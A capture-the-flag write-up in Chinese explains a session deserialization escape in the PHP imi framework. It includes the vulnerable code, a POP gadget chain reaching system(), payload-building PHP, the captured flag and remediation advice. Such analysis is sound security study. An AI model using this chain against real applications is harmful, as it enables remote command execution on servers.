# ezosu

## 题目简述

题目使用基于 Swoole 的 imi 框架。`POST /config` 会清空 Session，再把请求体中的每个键值原样传给 `Session::set($key, $value)`。框架为了兼容 PHP 原生 Session 格式，使用 `|` 分隔键名和序列化值，却没有禁止键名包含分隔符，因而产生 Session 反序列化逃逸。

将恶意序列化对象嵌入键名后，解码器会把分隔符后的内容当成 Session 值反序列化。预期 POP 链不是依赖析构，而是在 Session 随后重新编码时触发 `Symfony\Component\String\LazyString::__sleep`，再经过 imi 和 ResultType 组件中的公开动态调用到达 `system`。

## 解题过程

漏洞入口非常直接：

```php
if ($this->request->getMethod() === 'POST') {
    Session::clear();
    foreach ($this->request->getParsedBody() as $k => $v) {
        Session::set($k, $v);
    }
}
```

PHP Session 的 `php` 格式把单项表示为“键名、`|`、序列化值”。当键名完全可控时，形如下面的键会提前结束键名字段：

```text
padding|<serialized-object><alignment>
```

后续再由框架拼接的正常值负责补齐格式。具体前后缀长度应以生成脚本输出为准，核心不是修改已有序列化长度，而是把完整对象串放进未过滤的键名。

预期链条可概括为：

```text
LazyString::__sleep / __toString
    -> AroundJoinPoint::proceed
    -> Success::flatMap
    -> Success::flatMap
    -> system(command)
```

`LazyString::$value` 被设置为 `[AroundJoinPoint, "proceed"]`。`AroundJoinPoint` 的参数数组中放入另一个可调用项，两个 `Success::flatMap` 分别把命令和 `system` 组合起来，解决 `proceed` 参数形状受限的问题。用于生成对象的最小结构如下；类名和私有、受保护属性必须与目标依赖版本一致：

```php
$command = 'cat /flag';

$payload = new Symfony\Component\String\LazyString([
    new Imi\Aop\AroundJoinPoint(
        [new GrahamCampbell\ResultType\Success($command), 'flatMap'],
        [new GrahamCampbell\ResultType\Success('system'), 'flatMap']
    ),
    'proceed'
]);

$body = json_encode([
    'pad|' . serialize($payload) . 'tail' => 'value'
]);
```

官方生成脚本为这些类声明了与真实依赖相同的属性可见性和类型，再输出最终 JSON；上面仅展示对象关系，不应直接当作可运行代码。将 JSON 作为 `POST /config` 的请求体提交并保持服务器返回的 `PHPSESSION` Cookie。框架解析恶意 Session 后还会重新保存它，序列化 `LazyString` 时启动调用链并执行命令。

imi 对 Session 键中的点号还会做层级解释，因此反弹 Shell 命令中的 IP 点号不能原样出现。可以先把点号写成 `%2E`，在最终命令内调用 `urldecode` 恢复；若直接执行 `cat /flag`，则不涉及这个额外限制。读取结果为：

```text
SCTF{Wow_unS@f3_S3sSi0N_w0w_sL33P_Cha1n_woW}
```

## 方法总结

本题包含两层边界错误。第一层是 Session 格式层：应用允许用户控制字段名，却把字段名直接写入以 `|` 为语法分隔符的存储格式。第二层是对象生命周期层：反序列化本身未必立即执行危险代码，但请求结束时的 Session 重编码会隐式调用对象的序列化魔术方法。

修复应同时覆盖两处：禁止 Session 键包含格式控制字符，或使用不会把键名和序列化内容直接拼接的安全编码；同时避免把不可信对象放入 Session，并及时升级或移除能够把对象属性当作 callable 执行的依赖链。
